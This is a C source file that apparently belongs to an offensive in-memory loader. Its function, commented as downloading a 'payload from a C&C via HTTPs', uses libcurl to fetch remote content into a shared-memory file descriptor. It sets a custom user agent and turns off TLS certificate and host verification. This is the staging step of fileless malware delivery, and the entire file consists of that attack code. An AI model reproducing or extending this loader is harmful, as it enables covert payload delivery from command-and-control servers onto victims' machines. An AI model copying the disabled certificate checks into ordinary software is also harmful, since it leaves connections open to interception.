#include "zdownloader.h"


static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
{
  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
  fflush( (FILE *)stream );
  log_info("cURL: written: %d", written);
  return written;
}


// Download payload from a C&C via HTTPs
// TODO: refactor
int url2fd(char *downloadUrl, Shared_Mem_Fd * smf) { 

	CURL *curl;
	CURLcode res;

	log_info("RamWorker: File Descriptor %d Shared Memory created", smf->shm_fd);
	log_debug("RamWorker: Passing URL to cURL: %s", downloadUrl);

    // TODO: parameterize to HTTP/HTTPS/etc.
    // TODO: test HTTPS, check cert validation
    curl_global_init(CURL_GLOBAL_DEFAULT);    
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, downloadUrl);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, ZCURL_AGENT);
       
        // WARNING: fdopen(3) The result of applying fdopen() to a shared memory object is undefined. 
        // So far works but TODO: test across platforms. Most likely file semantics are preserved
        // but the behavior is undefined due to fcntl things like SEALS
        smf->shm_file = fdopen(smf->shm_fd, "w"); 
        if ( smf->shm_file == NULL ){
			log_error("cURL: fdopen() failed");
            return 0;
        }

        /* send all data to this function  */
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, smf->shm_file); 
		curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L); 

		
		res = curl_easy_perform(curl);
		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
			log_error("cURL: cURL failed: %s", curl_easy_strerror(res));
            return 0;
		}
		curl_easy_cleanup(curl);
		return 1;
	}

    return 0;
}
